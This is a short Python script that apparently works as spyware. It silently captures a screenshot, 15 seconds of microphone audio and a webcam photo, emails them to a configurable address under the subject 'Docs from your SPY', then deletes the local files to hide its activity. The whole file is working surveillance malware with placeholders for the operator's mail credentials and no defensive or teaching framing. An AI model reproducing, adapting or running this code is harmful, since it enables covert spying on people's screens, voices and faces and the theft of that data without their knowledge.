import numpy as np
import pyautogui
import cv2
import pyaudio
import wave
import os
import email, smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def getscreen():
	image = pyautogui.screenshot()    
	image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR) 
	cv2.imwrite("image1.jpg", image)

def getmicrophone():
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	CHUNK = 1024
	RECORD_SECONDS = 15 #You can change the time of mic record.
	WAVE_OUTPUT_FILENAME = "file1.wav"
	 
	audio = pyaudio.PyAudio()
	stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
	frames = []
	for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
	    data = stream.read(CHUNK)
	    frames.append(data)
	stream.stop_stream()
	stream.close()
	audio.terminate()
	waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	waveFile.setnchannels(CHANNELS)
	waveFile.setsampwidth(audio.get_sample_size(FORMAT))
	waveFile.setframerate(RATE)
	waveFile.writeframes(b''.join(frames))
	waveFile.close()

def getphoto():
	camera = cv2.VideoCapture(0)
	for i in range(5):
	    return_value, image = camera.read()
	    cv2.imwrite("user1.jpg", image)
	del(camera)


def main():
	try:
		getscreen()
		getmicrophone()
		getphoto()
	except:
		pass

subject = "Docs from your SPY"
body = "Here some files for you"
sender_email = "SENDER_MAIL_ADDRESS_HERE" #CHANGE THIS
receiver_email = "RECIEVER_MAIL_ADDRESS_HERE" #CHANGE THIS
password = "SENDER_MAIL_PASSWORD_HERE" #CHANGE THIS
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email
message.attach(MIMEText(body, "plain"))
files = ["image1.jpg", "file1.wav", "user1.jpg"]

def sendmail():
	for filename in files:
		with open(filename, "rb") as attachment:
		    part = MIMEBase("application", "octet-stream")
		    part.set_payload(attachment.read())

		encoders.encode_base64(part)
		part.add_header(
		    "Content-Disposition",
		    f"attachment; filename= {filename}",
		)

		message.attach(part)
		text = message.as_string()

	server = smtplib.SMTP("mail.YOUR_MAIL_PROVIDER_HERE.com", 587) #CHANGE THIS.
	server.login(sender_email, password)
	server.sendmail(sender_email, receiver_email, text)

def clearfiles():
	cmd1 = "del image1.jpg"
	cmd2 = "del file1.wav"
	cmd3 = "del user1.jpg"
	process = os.popen(cmd1)
	process = os.popen(cmd2)
	process = os.popen(cmd3)	

if __name__ == '__main__':
	main()
	sendmail()
	clearfiles()
